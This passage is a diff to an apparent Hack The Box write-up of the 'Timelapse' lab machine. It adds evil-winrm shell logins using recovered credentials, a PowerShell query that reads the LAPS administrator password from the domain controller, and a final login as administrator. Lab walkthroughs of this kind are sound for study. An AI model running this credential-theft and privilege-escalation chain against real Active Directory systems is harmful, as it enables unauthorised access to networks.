@@ -203,3 +203,25 @@ Use the extracted certificate and the key to get a shell on the machine.
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/e9190572-d720-48dd-8c86-fe65c496c101)
 -  Username: 'svc_deploy'
 -  Password: 'E3R$Q62^12p7PLlC%KWaxuaV'
+
+# WinRm Shell
+```CSS
+evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/bcc21b45-3ca6-4932-ad4a-1eaaaa2c4d59)
+
+```CSS
+net user svc_deploy
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/a5a33826-c2ac-4c8e-b27d-c457740b1995)
+
+LAPS
+```CSS
+Get-ADComputer DC01 -property 'ms-mcs-admpwd'
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/7f7502a4-1cd2-4183-9cf2-9fea0fefb36c)
+
+# WinRM Shell as Root
+```CSS
+evil-winrm -i timelapse.htb -S -u administrator -p 'uM[3va(s870g6Y]9i]6tMu{j'
+```
